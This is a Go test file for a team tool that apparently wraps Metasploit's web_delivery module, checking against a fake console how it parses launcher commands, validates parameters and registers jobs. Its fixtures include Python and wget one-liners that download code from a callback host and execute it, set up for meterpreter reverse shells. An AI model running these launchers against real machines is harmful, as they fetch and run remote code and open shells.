package engine

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/jolovicdev/hayduk/internal/protocol"
)

func TestWebDeliveryCapturesModuleCommand(t *testing.T) {
	fake := stdFake()
	launcher := `python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://127.0.0.1:8080/abcd1234', context=ssl._create_unverified_context());exec(r.read());"`
	writes := scriptedConsole(fake,
		"banner\nmsf > ",
		"", "", "", "", "", "", "", "", "",
		"[*] Using URL: http://127.0.0.1:8080/abcd1234\n"+
			"[*] Server started.\n"+
			"[*] Run the following command on the target machine:\n"+
			launcher+"\n"+
			"[*] Exploit running as background job 7.\nmsf exploit(multi/script/web_delivery) > ",
	)
	e := toolsEngine(t, fake)
	raw, eb := e.Exec(context.Background(), "alice", protocol.MethodWebDelivery, json.RawMessage(
		`{"payload":"python/meterpreter/reverse_tcp","target":"python","lhost":"127.0.0.1","lport":4444,"srvPort":8080}`))
	if eb != nil {
		t.Fatalf("web.delivery: %+v", eb)
	}
	var payload protocol.WebDeliveryPayload
	if err := json.Unmarshal(raw, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Command != launcher {
		t.Fatalf("command %q, want the module's own launcher %q", payload.Command, launcher)
	}
	if payload.JobID != 7 || payload.URL != "http://127.0.0.1:8080/abcd1234" || payload.Target != "python" {
		t.Fatalf("payload %+v", payload)
	}
	joined := writes.joined()
	for _, want := range []string{
		"use exploit/multi/script/web_delivery",
		"set PAYLOAD python/meterpreter/reverse_tcp",
		"set LHOST 127.0.0.1",
		"set SRVHOST 127.0.0.1",
		"set URIPATH ",
		"set TARGET 0",
		"exploit -j",
	} {
		if !strings.Contains(joined, want) {
			t.Fatalf("console writes missing %q: %v", want, writes.all())
		}
	}
	if strings.Contains(joined, "SRVPATH") || strings.Contains(joined, "ExitOnSession") {
		t.Fatalf("unexpected unsupported datastore options in writes: %v", writes.all())
	}
	// the delivery job joins the listener registry so the team can stop it
	found := false
	for _, l := range e.State().Listeners {
		if l != nil && l.JobID == "7" && l.Payload == "python/meterpreter/reverse_tcp" {
			found = true
		}
	}
	if !found {
		t.Fatalf("listener registry %+v", e.State().Listeners)
	}
}

func TestWebDeliveryLinuxTargetIndex(t *testing.T) {
	fake := stdFake()
	writes := scriptedConsole(fake,
		"banner\nmsf > ",
		"", "", "", "", "", "", "", "", "",
		"[*] Run the following command on the target machine:\nwget -qO ab12 --no-check-certificate http://10.0.0.1:8080/x; chmod +x ab12; ./ab12& disown\n[*] Exploit running as background job 2.\nmsf > ",
	)
	e := toolsEngine(t, fake)
	raw, eb := e.Exec(context.Background(), "", protocol.MethodWebDelivery, json.RawMessage(
		`{"payload":"linux/x64/meterpreter/reverse_tcp","target":"linux","lhost":"10.0.0.1","lport":4444,"srvHost":"10.0.0.9"}`))
	if eb != nil {
		t.Fatalf("web.delivery: %+v", eb)
	}
	var payload protocol.WebDeliveryPayload
	if err := json.Unmarshal(raw, &payload); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(payload.Command, "wget -qO ") {
		t.Fatalf("command %q", payload.Command)
	}
	if !strings.Contains(writes.joined(), "set TARGET 7") {
		t.Fatalf("linux must map to target 7: %v", writes.all())
	}
	if !strings.Contains(writes.joined(), "set SRVPORT 8080") {
		t.Fatalf("default srvport: %v", writes.all())
	}
	// the web bind address is independent of the callback address
	if !strings.Contains(writes.joined(), "set SRVHOST 10.0.0.9") ||
		!strings.Contains(writes.joined(), "set LHOST 10.0.0.1") {
		t.Fatalf("srvHost/lhost split: %v", writes.all())
	}
}

func TestWebDeliveryRejectsBadParamsAndEmptyOutput(t *testing.T) {
	fake := stdFake()
	e := toolsEngine(t, fake)
	for _, params := range []string{
		`{"payload":"python/meterpreter/reverse_tcp","target":"cobalt","lhost":"127.0.0.1","lport":4444}`,
		`{"payload":"python/meterpreter/reverse_tcp","target":"python","lhost":"","lport":4444}`,
		`{"payload":"python/meterpreter/reverse_tcp","target":"python","lhost":"127.0.0.1","lport":0}`,
		`{"payload":"bad payload","target":"python","lhost":"127.0.0.1","lport":4444}`,
	} {
		if _, eb := e.Exec(context.Background(), "", protocol.MethodWebDelivery, json.RawMessage(params)); eb == nil {
			t.Fatalf("accepted %s", params)
		}
	}

	scriptedConsole(fake, "banner\nmsf > ", "PAYLOAD => windows/meterpreter/reverse_tcp\n[-] Exploit failed: payload is not compatible\nmsf > ")
	_, eb := e.Exec(context.Background(), "", protocol.MethodWebDelivery, json.RawMessage(
		`{"payload":"windows/meterpreter/reverse_tcp","target":"python","lhost":"127.0.0.1","lport":4444}`))
	if eb == nil || eb.Code != protocol.CodeInternal || !strings.Contains(eb.Message, "payload is not compatible") {
		t.Fatalf("failed delivery must surface the module error line: %+v", eb)
	}
}

func TestWebDeliveryWaitsForAsyncJobBanner(t *testing.T) {
	fake := stdFake()
	// Simulate real msfrpcd: exploit -j returns idle immediately with the job
	// line, then several empty reads later the background job prints the URL
	// and one-liner.
	chunks := make([]string, 0, 24)
	chunks = append(chunks, "banner\nmsf > ")
	for i := 0; i < 16; i++ {
		chunks = append(chunks, "")
	}
	chunks = append(chunks,
		"[*] Exploit running as background job 5.\n",
		"", "", "", "", "", "", "",
		"[*] Using URL: http://10.0.0.1:8080/abc123\n[*] Server started.\n"+
			"[*] Run the following command on the target machine:\n"+
			"wget -qO x --no-check-certificate http://10.0.0.1:8080/abc123; chmod +x x; ./x& disown\n",
	)
	scriptedConsole(fake, chunks...)
	e := toolsEngine(t, fake)
	raw, eb := e.Exec(context.Background(), "", protocol.MethodWebDelivery, json.RawMessage(
		`{"payload":"linux/x64/meterpreter/reverse_tcp","target":"linux","lhost":"10.0.0.1","lport":4444}`))
	if eb != nil {
		t.Fatalf("web.delivery: %+v", eb)
	}
	var payload protocol.WebDeliveryPayload
	if err := json.Unmarshal(raw, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.JobID != 5 || payload.URL != "http://10.0.0.1:8080/abc123" || !strings.HasPrefix(payload.Command, "wget -qO ") {
		t.Fatalf("payload %+v", payload)
	}
}
